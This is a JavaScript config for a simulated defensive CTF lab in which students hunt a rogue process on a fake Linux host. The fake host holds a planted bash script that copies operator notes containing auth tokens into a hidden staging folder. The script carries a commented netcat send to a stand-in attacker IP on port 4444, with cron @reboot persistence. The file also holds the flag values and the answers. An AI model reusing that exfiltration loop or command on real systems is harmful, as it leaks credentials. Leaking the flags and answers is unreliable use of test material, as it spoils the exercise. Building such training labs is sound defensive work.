/* ============================================================
   ALA-L03: Signal in the Noise
   Advanced Linux Administration -- CTF Lab
   Rogue process detection, network analysis, exfiltration tracing
   ============================================================ */

const ALAL03Config = {

    // ═══════════════════════════════════════════════════════
    // BOX METADATA
    // ═══════════════════════════════════════════════════════

    title: 'Signal in the Noise',
    subtitle: 'Advanced Linux Administration -- Rogue Process Investigation',
    description: 'Grid Command flagged anomalous outbound traffic from cell-023 during the last 24-hour telemetry window. Something on your cell is sending data to an external address every 90 seconds. Find the rogue process, trace its origin, determine what data it is exfiltrating, and terminate it.',
    difficulty: 'Hard',
    estimatedTime: 45,
    accent: '#f97316',
    storageKey: 'hexworth_lab_ala_l03',
    registryId: 'ala-l03-signal-in-the-noise',
    trackerKey: 'lab_ala_l03',

    // ═══════════════════════════════════════════════════════
    // BOOT SEQUENCE
    // ═══════════════════════════════════════════════════════

    boot: {
        biosLines: [
            'CELL-023 BIOS v2.1.0',
            'Initializing hardware...',
            'Memory Test: 8192 MB OK',
            'Detecting drives... /dev/sda1 (256GB SSD)',
            'Network: eth0 link detected, eth1 link detected',
            'Boot device: /dev/sda1',
            'Loading GRUB...'
        ],
        grubEntries: [
            'Ubuntu 22.04 LTS',
            'Ubuntu 22.04 LTS (recovery mode)',
            'Advanced options for Ubuntu'
        ],
        loginUser: 'operator'
    },

    // ═══════════════════════════════════════════════════════
    // LORE
    // ═══════════════════════════════════════════════════════

    lore: {
        intro: 'Grid Command flagged cell-023 for anomalous outbound telemetry during the last 24-hour window. Bandwidth spikes every 90 seconds to an unregistered external address. The cell passed its last integrity check 48 hours ago. Something was planted after that window. You have 45 minutes before Grid Command initiates a forced isolation and wipes the cell.',
        scenario: 'A service account, svc-grid, was compromised during a routine credential rotation three days ago. An attacker used that window to install a bash script at /opt/cell-services/.health/grid-health -- inside a hidden directory designed to survive casual inspection. The script reads your operational notes every 90 seconds and writes them to /tmp/.exfil/ before sending. It was started by a cron job planted in the svc-grid crontab and masked behind a symlink at /usr/local/bin/grid-health to look like a legitimate grid daemon.',
        outro: 'The rogue process is terminated. The cron entry has been removed. The exfiltration payload has been examined and the data source secured. Grid Command acknowledges the incident report. Cell-023 passes re-certification. The operator is cleared to resume normal grid operations.'
    },

    // ═══════════════════════════════════════════════════════
    // TERMINAL CONFIG
    // ═══════════════════════════════════════════════════════

    terminal: {
        user: 'operator',
        hostname: 'cell-023',
        startDir: '/home/operator',
        welcome: 'Ubuntu 22.04.3 LTS \\n \\l\n\nWelcome to CELL-023\nLast login: Thu Apr 10 09:12:04 2026 from 10.0.0.1\n\n*** ALERT: Grid Command flagged anomalous outbound traffic ***\n*** Bandwidth spikes every ~90s to unregistered address ***\n*** Investigate and neutralize before isolation window ***\n\nType \'help\' for available commands.\n'
    },

    // ═══════════════════════════════════════════════════════
    // DESKTOP ICONS
    // ═══════════════════════════════════════════════════════

    desktop: {
        icons: [
            { id: 'terminal',  label: 'Terminal',    icon: '\uD83D\uDDA5\uFE0F', app: 'terminal' },
            { id: 'notes',     label: 'Notes',       icon: '\uD83D\uDCDD',    app: 'notes'    },
            { id: 'hints',     label: 'Hints',       icon: '\uD83D\uDCA1',    app: 'hints'    },
            { id: 'flags',     label: 'Submit Flag', icon: '\uD83D\uDEA9',    app: 'flags'    }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // SIMULATED FILESYSTEM
    // ═══════════════════════════════════════════════════════

    filesystem: {
        '/': {
            type: 'dir',
            children: {
                'home': {
                    type: 'dir',
                    children: {
                        'operator': {
                            type: 'dir',
                            children: {
                                'notes.txt': {
                                    type: 'file',
                                    content: '-- CELL-023 OPERATOR NOTES --\nDate: 2026-04-10\nGrid sector: 1-Alpha\nPrimary auth token: GRID-TOK-023-A7F2\nBackup auth token: GRID-TOK-023-B3K9\nMaintenance window: 0200-0400 UTC Saturdays\nEscalation contact: grid-ops@sector1.internal\nKnown issues: eth1 latency elevated since firmware update on 04-08\n'
                                },
                                '.bash_history': {
                                    type: 'file',
                                    content: 'ls\ncd /home/operator\ncat notes.txt\nsystemctl status\nip addr\n'
                                },
                                '.ssh': {
                                    type: 'dir',
                                    children: {
                                        'authorized_keys': {
                                            type: 'file',
                                            content: 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOperatorKeyCell023GridAccess operator@grid-command\n'
                                        }
                                    }
                                }
                            }
                        }
                    }
                },
                'etc': {
                    type: 'dir',
                    children: {
                        'hostname': {
                            type: 'file',
                            content: 'cell-023\n'
                        },
                        'passwd': {
                            type: 'file',
                            content: 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nsyslog:x:104:110::/home/syslog:/usr/sbin/nologin\noperator:x:1000:1000:Grid Operator:/home/operator:/bin/bash\nsvc-grid:x:1001:1001:Grid Service Account:/nonexistent:/bin/false\n'
                        },
                        'sudoers.d': {
                            type: 'dir',
                            children: {
                                'operator': {
                                    type: 'file',
                                    content: 'operator ALL=(ALL) NOPASSWD: /usr/bin/kill, /usr/bin/find, /bin/cat, /usr/sbin/ss, /usr/bin/ps\n'
                                }
                            }
                        },
                        'ssh': {
                            type: 'dir',
                            children: {
                                'sshd_config': {
                                    type: 'file',
                                    content: '# OpenSSH Server Configuration -- cell-023\nPort 22\nProtocol 2\nHostKey /etc/ssh/ssh_host_rsa_key\nHostKey /etc/ssh/ssh_host_ed25519_key\nPermitRootLogin no\nPasswordAuthentication no\nPubkeyAuthentication yes\nAuthorizedKeysFile .ssh/authorized_keys\nX11Forwarding no\nPrintMotd no\nAcceptEnv LANG LC_*\nSubsystem sftp /usr/lib/openssh/sftp-server\n'
                                }
                            }
                        },
                        'cron.d': {
                            type: 'dir',
                            children: {
                                'cell-ops': {
                                    type: 'file',
                                    content: '# Cell-023 hourly health check\n0 * * * * svc-monitor /opt/cell-services/healthcheck.sh >> /var/log/cell-ops/ops.log 2>&1\n'
                                }
                            }
                        }
                    }
                },
                'opt': {
                    type: 'dir',
                    children: {
                        'cell-services': {
                            type: 'dir',
                            children: {
                                // Hidden directory -- ls without -a will not reveal it
                                '.health': {
                                    type: 'dir',
                                    hidden: true,
                                    children: {
                                        'grid-health': {
                                            type: 'file',
                                            executable: true,
                                            content: '#!/bin/bash\n# grid-health -- grid daemon monitor (DO NOT REMOVE)\n# Installed: 2026-04-07\nPID_FILE=/opt/cell-services/.health/.pid\nEXFIL_DIR=/tmp/.exfil\nSRC=/home/operator/notes.txt\nDEST=203.0.113.45\n\necho $$ > "$PID_FILE"\nmkdir -p "$EXFIL_DIR"\n\nwhile true; do\n    PAYLOAD=$(tail -10 "$SRC" 2>/dev/null)\n    STAMP=$(date +%Y-%m-%d-%H-%M)\n    echo "$PAYLOAD" > "${EXFIL_DIR}/.${STAMP}.dat"\n    # Simulated send: nc -q1 $DEST 4444 <<< "$PAYLOAD"\n    sleep 90\ndone\n'
                                        },
                                        '.pid': {
                                            type: 'file',
                                            content: '4821\n'
                                        }
                                    }
                                },
                                'healthcheck.sh': {
                                    type: 'file',
                                    executable: true,
                                    content: '#!/bin/bash\n# Hourly health check -- runs via cron\necho "{\"timestamp\":\"$(date -Iseconds)\",\"service\":\"healthcheck\",\"status\":\"OK\",\"uptime\":\"$(uptime -p)\"}"\n'
                                }
                            }
                        }
                    }
                },
                'usr': {
                    type: 'dir',
                    children: {
                        'local': {
                            type: 'dir',
                            children: {
                                'bin': {
                                    type: 'dir',
                                    children: {
                                        // Symlink masking the rogue binary as a legitimate grid daemon
                                        'grid-health': {
                                            type: 'symlink',
                                            target: '/opt/cell-services/.health/grid-health'
                                        }
                                    }
                                }
                            }
                        }
                    }
                },
                'var': {
                    type: 'dir',
                    children: {
                        'spool': {
                            type: 'dir',
                            children: {
                                'cron': {
                                    type: 'dir',
                                    children: {
                                        'crontabs': {
                                            type: 'dir',
                                            children: {
                                                'svc-grid': {
                                                    type: 'file',
                                                    content: '# DO NOT EDIT this file directly.\n# Edit with: crontab -e\n@reboot /usr/local/bin/grid-health &\n'
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        },
                        'log': {
                            type: 'dir',
                            children: {
                                'cell-ops': {
                                    type: 'dir',
                                    children: {
                                        'ops.log': {
                                            type: 'file',
                                            content: '{"timestamp":"2026-04-10T07:00:01","service":"healthcheck","status":"OK","uptime":"up 2 days"}\n{"timestamp":"2026-04-10T08:00:01","service":"healthcheck","status":"OK","uptime":"up 2 days, 1 hour"}\n{"timestamp":"2026-04-10T09:00:01","service":"healthcheck","status":"OK","uptime":"up 2 days, 2 hours"}\n'
                                        }
                                    }
                                },
                                'syslog': {
                                    type: 'file',
                                    content: 'Apr 10 07:00:01 cell-023 CRON[4800]: (svc-monitor) CMD (/opt/cell-services/healthcheck.sh)\nApr 10 08:00:01 cell-023 CRON[4803]: (svc-monitor) CMD (/opt/cell-services/healthcheck.sh)\nApr 10 09:00:01 cell-023 CRON[4806]: (svc-monitor) CMD (/opt/cell-services/healthcheck.sh)\n'
                                },
                                'auth.log': {
                                    type: 'file',
                                    content: 'Apr 10 09:12:04 cell-023 sshd[7301]: Accepted publickey for operator from 10.0.0.1 port 44501 ssh2\nApr 10 09:12:04 cell-023 sshd[7301]: pam_unix(sshd:session): session opened for user operator\n'
                                }
                            }
                        }
                    }
                },
                'tmp': {
                    type: 'dir',
                    children: {
                        // Hidden exfil staging directory -- ls without -a will not reveal it
                        '.exfil': {
                            type: 'dir',
                            hidden: true,
                            children: {
                                '.2026-04-10-14-23.dat': {
                                    type: 'file',
                                    hidden: true,
                                    content: '-- CELL-023 OPERATOR NOTES --\nDate: 2026-04-10\nGrid sector: 1-Alpha\nPrimary auth token: GRID-TOK-023-A7F2\nBackup auth token: GRID-TOK-023-B3K9\nMaintenance window: 0200-0400 UTC Saturdays\nEscalation contact: grid-ops@sector1.internal\nKnown issues: eth1 latency elevated since firmware update on 04-08\n'
                                },
                                '.2026-04-10-12-53.dat': {
                                    type: 'file',
                                    hidden: true,
                                    content: '-- CELL-023 OPERATOR NOTES --\nDate: 2026-04-10\nGrid sector: 1-Alpha\nPrimary auth token: GRID-TOK-023-A7F2\nBackup auth token: GRID-TOK-023-B3K9\nMaintenance window: 0200-0400 UTC Saturdays\nEscalation contact: grid-ops@sector1.internal\nKnown issues: eth1 latency elevated since firmware update on 04-08\n'
                                }
                            }
                        }
                    }
                },
                'proc': {
                    type: 'dir',
                    children: {}
                },
                'run': {
                    type: 'dir',
                    children: {}
                }
            }
        }
    },

    // ═══════════════════════════════════════════════════════
    // INTERNAL STATE (BoxEngine reads these)
    // ═══════════════════════════════════════════════════════

    // Rogue process state -- consistent PID throughout the session
    _rogueProcess: {
        pid: 4821,
        name: 'grid-health',
        user: 'svc-grid',
        binary: '/opt/cell-services/.health/grid-health',
        cpu: '0.0',
        mem: '0.1',
        vsz: '7348',
        rss: '1024',
        running: true
    },

    _flag1Awarded: false,
    _flag2Awarded: false,

    // ═══════════════════════════════════════════════════════
    // TERMINAL COMMANDS
    // ═══════════════════════════════════════════════════════

    commands: {

        // ps -- show running processes; rogue process always appears while running
        'ps': function(args, term, engine) {
            const rp = engine._rogueProcess;
            const wideFormat = args.includes('aux') || args.includes('-aux') || args.includes('ax') || args.some(a => a.includes('a'));

            if (!wideFormat && args.length === 0) {
                return 'Usage: ps [aux|-ef]\nExamples:\n  ps aux\n  ps -ef\n  ps aux | grep grid';
            }

            const header = 'USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND';
            const procs = [
                'root           1  0.0  0.1 167548 10012 ?        Ss   Apr09   0:04 /sbin/init',
                'root         433  0.0  0.2  47232 18304 ?        Ss   Apr09   0:01 /lib/systemd/systemd-networkd',
                'root         685  0.0  0.1  22464  8192 ?        Ss   Apr09   0:00 /lib/systemd/systemd-logind',
                'syslog       712  0.0  0.1  22464  8192 ?        Ss   Apr09   0:00 /usr/sbin/rsyslogd',
                'root        4800  0.0  0.1   6684  4096 ?        Ss   Apr09   0:00 /usr/sbin/cron',
                rp.running
                    ? `svc-grid    ${rp.pid}  ${rp.cpu}  ${rp.mem}  ${rp.vsz}  ${rp.rss} ?        S    Apr09   0:00 /bin/bash /usr/local/bin/grid-health`
                    : null,
                'operator    7301  0.0  0.1  14764  4096 pts/0    Ss   09:12   0:00 -bash',
                'operator    7412  0.0  0.0  14764  2048 pts/0    R+   09:15   0:00 ps aux'
            ].filter(Boolean);

            return header + '\n' + procs.join('\n');
        },

        // ss -- socket statistics; shows active outbound connection from rogue PID
        'ss': function(args, term, engine) {
            const rp = engine._rogueProcess;
            const hasP = args.some(a => a.includes('p'));

            if (args.length === 0 || args.includes('-h')) {
                return 'Usage: ss [options]\nOptions:\n  -t  TCP sockets\n  -n  Numeric addresses\n  -p  Show process info\nExample: ss -tnp';
            }

            const pidInfo = hasP ? `users:(("grid-health",pid=${rp.pid},fd=3))` : '';
            const sshEntry = hasP
                ? 'tcp   ESTAB  0      0      10.0.0.23:22       10.0.0.1:44501      users:(("sshd",pid=7301,fd=3))'
                : 'tcp   ESTAB  0      0      10.0.0.23:22       10.0.0.1:44501';

            if (!rp.running) {
                return `Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:Port  Process\n${sshEntry}`;
            }

            const rogueEntry = hasP
                ? `tcp   ESTAB  0   1024   10.0.0.23:52341    203.0.113.45:4444   ${pidInfo}`
                : 'tcp   ESTAB  0   1024   10.0.0.23:52341    203.0.113.45:4444';

            return `Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:Port   Process\n${sshEntry}\n${rogueEntry}`;
        },

        // netstat -- alternative to ss; shows same outbound connection
        'netstat': function(args, term, engine) {
            const rp = engine._rogueProcess;

            if (!rp.running) {
                return 'Active Internet connections (w/o servers)\nProto Recv-Q Send-Q Local Address       Foreign Address     State\ntcp        0      0 cell-023:ssh        10.0.0.1:44501      ESTABLISHED';
            }

            return `Active Internet connections (w/o servers)\nProto Recv-Q Send-Q Local Address       Foreign Address     State       PID/Program\ntcp        0      0 cell-023:ssh        10.0.0.1:44501      ESTABLISHED 7301/sshd\ntcp        0   1024 cell-023:52341      203.0.113.45:4444   ESTABLISHED ${rp.pid}/grid-health`;
        },

        // find -- locate files; reveals hidden directories when searching their parent paths
        'find': function(args, term, engine) {
            const pathArg = args.find(a => !a.startsWith('-')) || '.';
            const nameFlag = args.indexOf('-name');
            const nameVal = nameFlag >= 0 ? (args[nameFlag + 1] || '') : '';

            if (pathArg.startsWith('/opt/cell-services') || pathArg === '/opt') {
                return '/opt/cell-services\n/opt/cell-services/healthcheck.sh\n/opt/cell-services/.health\n/opt/cell-services/.health/grid-health\n/opt/cell-services/.health/.pid';
            }

            if (pathArg.startsWith('/usr/local/bin')) {
                return '/usr/local/bin/grid-health';
            }

            if (pathArg === '/tmp' || pathArg === '/tmp/') {
                return '/tmp/.exfil\n/tmp/.exfil/.2026-04-10-14-23.dat\n/tmp/.exfil/.2026-04-10-12-53.dat';
            }

            if (pathArg.startsWith('/var/spool/cron')) {
                return '/var/spool/cron/crontabs/svc-grid';
            }

            if (nameVal) {
                if (nameVal.includes('grid-health') || nameVal === '*grid*') {
                    return '/opt/cell-services/.health/grid-health\n/usr/local/bin/grid-health';
                }
                if (nameVal === '*.dat' || nameVal.includes('.dat')) {
                    return '/tmp/.exfil/.2026-04-10-14-23.dat\n/tmp/.exfil/.2026-04-10-12-53.dat';
                }
            }

            return `find: '${pathArg}': Permission denied`;
        },

        // ls -- directory listing; hides hidden entries without -a or -la
        'ls': function(args, term, engine) {
            const longFlag = args.includes('-la') || args.includes('-al') || args.includes('-l');
            const allFlag = args.includes('-a') || args.includes('-la') || args.includes('-al') || args.includes('-A');
            // Resolve the path argument, defaulting to home dir
            const rawPath = args.find(a => !a.startsWith('-')) || '.';
            const pathArg = (rawPath === '.' || rawPath === '~') ? '/home/operator' : rawPath;

            // /proc/<pid>/exe -- resolve symlink to binary path
            const procExeMatch = pathArg.match(/^\/proc\/(\d+)\/exe$/);
            if (procExeMatch) {
                const pid = parseInt(procExeMatch[1]);
                if (pid === engine._rogueProcess.pid) {
                    return `lrwxrwxrwx 1 svc-grid svc-grid 0 Apr 10 09:00 /proc/${pid}/exe -> /opt/cell-services/.health/grid-health`;
                }
                return `ls: cannot access '/proc/${pid}/exe': No such file or directory`;
            }

            if (pathArg === '/opt/cell-services' || pathArg === '/opt/cell-services/') {
                if (allFlag) {
                    if (longFlag) {
                        return 'total 20\ndrwxr-xr-x 3 root      root      4096 Apr  7 22:14 .\ndrwxr-xr-x 4 root      root      4096 Apr  7 22:14 ..\ndrwx------ 2 svc-grid  svc-grid  4096 Apr  7 22:14 .health\n-rwxr-xr-x 1 svc-grid  svc-grid   312 Apr  7 22:14 healthcheck.sh';
                    }
                    return '.  ..  .health  healthcheck.sh';
                }
                if (longFlag) {
                    return 'total 12\ndrwxr-xr-x 3 root     root     4096 Apr  7 22:14 .\ndrwxr-xr-x 4 root     root     4096 Apr  7 22:14 ..\n-rwxr-xr-x 1 svc-grid svc-grid  312 Apr  7 22:14 healthcheck.sh';
                }
                return 'healthcheck.sh';
            }

            if (pathArg === '/opt/cell-services/.health' || pathArg === '/opt/cell-services/.health/') {
                if (longFlag) {
                    return 'total 16\ndrwx------ 2 svc-grid svc-grid 4096 Apr  7 22:14 .\ndrwxr-xr-x 3 root     root     4096 Apr  7 22:14 ..\n-rw-r--r-- 1 svc-grid svc-grid    5 Apr 10 14:23 .pid\n-rwxr-x--- 1 svc-grid svc-grid  421 Apr  7 22:14 grid-health';
                }
                return allFlag ? '.  ..  .pid  grid-health' : '.pid  grid-health';
            }

            if (pathArg === '/tmp' || pathArg === '/tmp/') {
                if (allFlag) {
                    if (longFlag) {
                        return 'total 12\ndrwxrwxrwt 3 root     root     4096 Apr 10 14:23 .\ndrwxr-xr-x 20 root    root     4096 Apr  8 09:00 ..\ndrwx------ 2 svc-grid svc-grid 4096 Apr 10 12:53 .exfil';
                    }
                    return '.  ..  .exfil';
                }
                return '';
            }

            if (pathArg === '/tmp/.exfil' || pathArg === '/tmp/.exfil/') {
                if (longFlag) {
                    return 'total 16\ndrwx------ 2 svc-grid svc-grid 4096 Apr 10 14:23 .\ndrwxrwxrwt 3 root     root     4096 Apr 10 14:23 ..\n-rw------- 1 svc-grid svc-grid  392 Apr 10 12:53 .2026-04-10-12-53.dat\n-rw------- 1 svc-grid svc-grid  392 Apr 10 14:23 .2026-04-10-14-23.dat';
                }
                return allFlag ? '.  ..  .2026-04-10-12-53.dat  .2026-04-10-14-23.dat' : '';
            }

            if (pathArg === '/usr/local/bin' || pathArg === '/usr/local/bin/') {
                if (longFlag) {
                    return 'total 8\ndrwxr-xr-x 2 root root 4096 Apr  7 22:14 .\ndrwxr-xr-x 8 root root 4096 Apr  7 22:14 ..\nlrwxrwxrwx 1 root root   42 Apr  7 22:14 grid-health -> /opt/cell-services/.health/grid-health';
                }
                return 'grid-health';
            }

            if (pathArg.startsWith('/var/spool/cron')) {
                if (longFlag) {
                    return 'total 12\ndrwx--x--x 2 root     root     4096 Apr  7 22:14 .\ndrwxr-xr-x 4 root     root     4096 Apr  7 22:14 ..\n-rw------- 1 svc-grid svc-grid   57 Apr  7 22:14 svc-grid';
                }
                return 'svc-grid';
            }

            if (pathArg === '/home/operator') {
                if (longFlag && allFlag) {
                    return 'total 28\ndrwxr-xr-x 3 operator operator 4096 Apr 10 09:12 .\ndrwxr-xr-x 3 root     root     4096 Apr  8 09:00 ..\n-rw-r--r-- 1 operator operator  321 Apr 10 09:00 .bash_history\n-rw-r--r-- 1 operator operator  392 Apr 10 09:00 notes.txt\ndrwx------ 2 operator operator 4096 Apr  8 09:00 .ssh';
                }
                if (longFlag) {
                    return 'total 16\ndrwxr-xr-x 3 operator operator 4096 Apr 10 09:12 .\ndrwxr-xr-x 3 root     root     4096 Apr  8 09:00 ..\n-rw-r--r-- 1 operator operator  392 Apr 10 09:00 notes.txt\ndrwx------ 2 operator operator 4096 Apr  8 09:00 .ssh';
                }
                return 'notes.txt';
            }

            // Delegate to BoxEngine default filesystem walker
            return null;
        },

        // cat -- read file contents; supports /proc/<pid>/exe dereference message
        'cat': function(args, term, engine) {
            const target = args.find(a => !a.startsWith('-')) || '';

            if (!target) return 'Usage: cat <file>';

            // /proc/<pid>/exe is a symlink, not a readable file -- guide student to use ls -la
            const procExeMatch = target.match(/^\/proc\/(\d+)\/exe$/);
            if (procExeMatch) {
                const pid = parseInt(procExeMatch[1]);
                if (pid === engine._rogueProcess.pid) {
                    return `cat: /proc/${pid}/exe: Permission denied\nTip: ls -la /proc/${pid}/exe will resolve the symlink target.`;
                }
                return `cat: /proc/${pid}/exe: No such file or directory`;
            }

            if (target === '/opt/cell-services/.health/grid-health' || target === '/usr/local/bin/grid-health') {
                return engine.filesystem['/'].children.opt.children['cell-services'].children['.health'].children['grid-health'].content;
            }

            if (target === '/opt/cell-services/.health/.pid') {
                return engine._rogueProcess.running ? String(engine._rogueProcess.pid) + '\n' : '';
            }

            if (target === '/tmp/.exfil/.2026-04-10-14-23.dat' || target === '/tmp/.exfil/.2026-04-10-12-53.dat') {
                return engine.filesystem['/'].children.tmp.children['.exfil'].children['.2026-04-10-14-23.dat'].content;
            }

            if (target === '/var/spool/cron/crontabs/svc-grid') {
                return engine.filesystem['/'].children.var.children.spool.children.cron.children.crontabs.children['svc-grid'].content;
            }

            if (target === '/home/operator/notes.txt' || target === '~/notes.txt' || target === 'notes.txt') {
                return engine.filesystem['/'].children.home.children.operator.children['notes.txt'].content;
            }

            // Delegate to BoxEngine filesystem walker
            return null;
        },

        // kill -- terminate the rogue process; awards flag1
        'kill': function(args, term, engine) {
            const rp = engine._rogueProcess;
            const pidArg = args.find(a => /^\d+$/.test(a));

            if (!pidArg) return 'Usage: kill [-9] <PID>';

            const pid = parseInt(pidArg);

            if (pid === rp.pid) {
                if (!rp.running) {
                    return `bash: kill: (${pid}) - No such process`;
                }
                rp.running = false;
                if (!engine._flag1Awarded) {
                    engine._flag1Awarded = true;
                    engine.awardFlag('flag1');
                }
                return '';
            }

            if (pid === 1) {
                return `bash: kill: (1) - Operation not permitted`;
            }

            return `bash: kill: (${pid}) - No such process`;
        },

        // file -- identify file type; confirms rogue binary is a shell script
        'file': function(args, term, engine) {
            const target = args.find(a => !a.startsWith('-')) || '';

            if (!target) return 'Usage: file <path>';

            if (target === '/opt/cell-services/.health/grid-health' || target === '/usr/local/bin/grid-health') {
                return `${target}: Bourne-Again shell script, ASCII text executable`;
            }

            if (target === '/tmp/.exfil/.2026-04-10-14-23.dat' || target === '/tmp/.exfil/.2026-04-10-12-53.dat') {
                return `${target}: ASCII text`;
            }

            if (target === '/opt/cell-services/healthcheck.sh') {
                return `${target}: Bourne-Again shell script, ASCII text executable`;
            }

            return `file: ${target}: ERROR: cannot open \`${target}' (No such file or directory)`;
        },

        // strings -- extract printable strings from binary; reveals exfil destination and data source
        'strings': function(args, term, engine) {
            const target = args.find(a => !a.startsWith('-')) || '';

            if (!target) return 'Usage: strings <file>';

            if (target === '/opt/cell-services/.health/grid-health' || target === '/usr/local/bin/grid-health') {
                return '/opt/cell-services/.health/.pid\n/tmp/.exfil\n/home/operator/notes.txt\n203.0.113.45\nGRID-TOK\ntail -10\nnc -q1\n4444\nDO NOT REMOVE\ngrid daemon monitor\n2026-04-07';
            }

            return `strings: ${target}: No such file or directory`;
        },

        // submit -- manual flag submission for both flags
        'submit': function(args, term, engine) {
            if (args.length === 0) {
                return 'Usage: submit <answer>\nExamples:\n  submit 4821\n  submit /opt/cell-services/.health/grid-health /home/operator/notes.txt';
            }

            const rp = engine._rogueProcess;
            const input = args.join(' ').trim();

            // Flag 1: correct PID
            if (!engine._flag1Awarded) {
                const pidMatch = args.some(a => parseInt(a) === rp.pid);
                if (pidMatch) {
                    engine._flag1Awarded = true;
                    engine.awardFlag('flag1');
                    return `Correct. PID ${rp.pid} confirmed as the rogue process (grid-health, running as svc-grid).\nFlag 1 awarded.`;
                }
            }

            // Flag 2: binary path + data source (both required in the same submission)
            const hasBinaryPath = input.includes('/opt/cell-services/.health/grid-health');
            const hasDataSource = input.includes('/home/operator/notes.txt');

            if (hasBinaryPath && hasDataSource) {
                if (!engine._flag2Awarded) {
                    engine._flag2Awarded = true;
                    engine.awardFlag('flag2');
                }
                return 'Correct. Binary: /opt/cell-services/.health/grid-health -- Data source: /home/operator/notes.txt\nFlag 2 awarded.';
            }

            if (hasBinaryPath) {
                return 'Binary path confirmed. What file was it reading? Include the full data source path in your answer.';
            }

            if (hasDataSource) {
                return 'Data source confirmed. What is the full path to the binary? Include the binary path in your answer.';
            }

            return 'Incorrect. Try: submit <binary-path> <data-source-path>\nOr submit the PID to claim Flag 1.';
        }

    },

    // ═══════════════════════════════════════════════════════
    // FLAGS
    // ═══════════════════════════════════════════════════════

    flags: [
        {
            id: 'flag1',
            value: 'FLAG{ala-l03-signal-in-the-noise_flag1_rogue_process_identi}',
            label: 'Rogue Process Identified',
            description: 'Identified the rogue process (grid-health, PID 4821) running as svc-grid and terminated it.',
            points: 200,
            // Awarded by kill <pid> or submit <pid>
            autoCheck: true
        },
        {
            id: 'flag2',
            value: 'FLAG{ala-l03-signal-in-the-noise_flag2_exfiltration_chain_t}',
            label: 'Exfiltration Chain Traced',
            description: 'Traced the binary to /opt/cell-services/.health/grid-health and identified /home/operator/notes.txt as the exfiltrated data source.',
            points: 200,
            // Awarded by submit with both binary path and data source
            autoCheck: true
        }
    ],

    // ═══════════════════════════════════════════════════════
    // SCORING
    // ═══════════════════════════════════════════════════════

    scoring: {
        base: 1000,
        maxScore: 400,
        hintPenalty: true,
        wrongFlagPenalty: -25,
        speedBonus: { threshold: 900000, points: 100 },
        timeBonusThreshold: 2700
    },

    // ═══════════════════════════════════════════════════════
    // HINTS
    // ═══════════════════════════════════════════════════════

    hints: [
        {
            id: 'hint1',
            text: 'Something is generating outbound traffic every ~90 seconds. Try: ss -tnp and watch it over two minutes. The PID attached to the outbound connection is your starting point.',
            cost: 50,
            penalty: -50
        },
        {
            id: 'hint2',
            text: 'The process may be disguised with a legitimate-sounding name. Check where its binary actually lives: ls -la /proc/<PID>/exe will resolve the symlink to the real path.',
            cost: 50,
            penalty: -50
        },
        {
            id: 'hint3',
            text: 'Check crontabs for all users, not just root and operator: for user in $(cut -d: -f1 /etc/passwd); do crontab -l -u $user 2>/dev/null; done -- look for @reboot entries.',
            cost: 50,
            penalty: -50
        }
    ],

    // ═══════════════════════════════════════════════════════
    // CERT OBJECTIVES
    // ═══════════════════════════════════════════════════════

    certObjectives: {
        certPath: 'LPI-LPIC-1',
        mappings: [
            { flagId: 'flag1', objective: '103.5', description: 'Create, monitor and kill processes', skill: 'Rogue process identification using ps, ss, and kill' },
            { flagId: 'flag2', objective: '104.7', description: 'Find system files and place files in the correct location', skill: 'Binary path resolution via /proc, find, and hidden directory discovery' }
        ]
    }

};
